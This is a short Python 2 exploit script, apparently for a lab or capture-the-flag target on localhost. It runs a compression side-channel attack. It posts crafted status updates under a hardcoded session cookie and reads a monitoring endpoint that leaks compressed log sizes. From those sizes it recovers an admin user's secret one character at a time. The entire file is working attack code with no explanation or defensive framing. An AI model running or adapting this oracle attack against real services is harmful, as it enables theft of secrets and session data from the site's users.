import requests
import string
import json

POST_URL = "http://127.0.0.1:8000/status_update/"
LEAK_URL = "http://127.0.0.1:8000/monitoring/"
latest_leak = 0

def post(blob):
	r = requests.post(POST_URL, data={'text': blob}, headers={'Cookie': 'sessionid=n67bq1v0yeevwvl6oxqcik70wgq4auhz'})
	assert r.status_code == 200

def try_get_compressed_size():
	global latest_leak
	r = requests.get(LEAK_URL+str(latest_leak))
	assert r.status_code == 200
	logs = json.loads(r.text)['logs']
	for log in logs:
		latest_leak = max(latest_leak, log['id'])
		if log['user__username'] != 'admin':
			continue
		if log['size'] == 64:
			continue
		return log['compressed_size']
	return None

def read_old_compressed_data():
	global latest_leak
	r = requests.get(LEAK_URL+str(latest_leak))
	assert r.status_code == 200
	logs = json.loads(r.text)['logs']
	for log in logs:
		latest_leak = max(latest_leak, log['id'])
cache = {}
def get_compressed_size(attempt):
	global cache
	if attempt in cache:
		return cache[attempt]
	size = try_get_compressed_size()
	while size is None:
		size = try_get_compressed_size()
	cache[attempt] = size
	return size

def twiddle_bits(curr, maybe):
	alphabet = string.ascii_lowercase + string.digits
	smallest_size = None
	if maybe:
		maybe = list(maybe)
	else:
		maybe = [""]
	best_letters = ""
	best_attempt = None
	for chosen_maybe in maybe:
		for a in alphabet:
			attempt = curr + chosen_maybe + a
			blob = attempt[-8:] + '!'*(100-len(attempt[-8:]))
			post(blob)
			size = get_compressed_size(attempt)
			print a, size
			if size == smallest_size:
				best_letters += a
			elif (smallest_size is None or size < smallest_size):
				print size
				best_letters = a
				smallest_size = size
				if chosen_maybe:
					best_attempt = curr + chosen_maybe
				else:
					best_attempt = attempt
	print best_letters
	if len(best_letters) > 1 and maybe == [""]:
		print "got multiple candidates"
		return twiddle_bits(curr, best_letters)
	return best_attempt

def main():
	read_old_compressed_data()
	curr = "(("
	while len(curr) < 34:
		curr = twiddle_bits(curr, "")
		print curr



if __name__ == '__main__':
	main()